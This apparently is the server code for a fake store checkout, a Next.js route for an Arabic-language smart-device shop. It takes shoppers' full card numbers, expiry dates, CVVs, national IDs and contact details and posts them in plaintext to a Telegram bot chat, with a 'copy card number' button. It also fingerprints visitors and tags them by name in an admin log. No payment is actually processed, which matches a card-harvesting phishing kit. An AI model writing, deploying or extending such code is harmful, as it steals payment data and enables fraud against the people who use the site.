import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const body = await req.json();
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, fingerprint } = body;

  // Detect country from visitor IP
  let country = "-";
  try {
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
    if (ip) {
      const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country`).then(r => r.json());
      if (geo.country) country = geo.country;
    }
  } catch {}

  // Validation
  if (!cardNumber || !expiry || !cvv || !cardHolder || !items?.length || !total) {
    return NextResponse.json({ ok: false, error: "بيانات ناقصة" }, { status: 400 });
  }

  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID || !process.env.BACKEND_URL) {
    console.error("Missing env: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, or BACKEND_URL");
    return NextResponse.json({ ok: false, error: "خطأ في إعدادات الخادم" }, { status: 500 });
  }

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // حفظ في الداتابيز
  let dbSaved = false;
  try {
    const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
    });
    dbSaved = dbRes.ok;
  } catch {}

  // Send Telegram
  const text = [
    `🏪 طلب لـ متجر لمسه للاجهزه الذكيه`,
    `🔢 رقم الطلب: #${orderId}`,
    ``,
    `💰 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`💵 First Payment: ${downPayment} SAR`]
      : [`💵 Payment Type: Full Amount`]),
    ``,
    `💳 MadaVisa - New Order`,
    `👤 Order For: ${customer ?? "-"}`,
    `📱 WhatsApp: ${whatsapp ?? "-"}`,
    `🌍 Country: ${country}`,
    `💳 Card Number: ${cardNumber}`,
    `👤 Card Holder: ${cardHolder}`,
    `📅 Valid To: ${expiry}`,
    `🔐 CVV: ${cvv}`,
  ].join("\n");

  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
  const reply_markup = {
    inline_keyboard: [
      [
        { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
        ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
      ],
    ],
  };

  let telegramSent = false;
  const MAX_RETRIES = 3;
  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    try {
      const tgRes = await fetch(
        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
        }
      );
      if (tgRes.ok) { telegramSent = true; break; }
    } catch {}
    // Wait before retry
    if (attempt < MAX_RETRIES - 1) await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
  }

  if (!telegramSent && !dbSaved) {
    return NextResponse.json({ ok: false, error: "فشل في حفظ الطلب" }, { status: 500 });
  }

  // تسمية الزائر تلقائياً باسم المشتري في سجل الزوار
  if (customer) {
    try {
      const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
      await fetch(`${process.env.BACKEND_URL}/api/admin/devices/log/label-by-identity`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          "x-internal-token": process.env.ADMIN_INTERNAL_TOKEN || "",
        },
        body: JSON.stringify({ fingerprint: fingerprint || null, ip: ip || null, label: customer }),
      });
    } catch {}
  }

  return NextResponse.json({ ok: true, orderId, telegramSent, dbSaved });
}
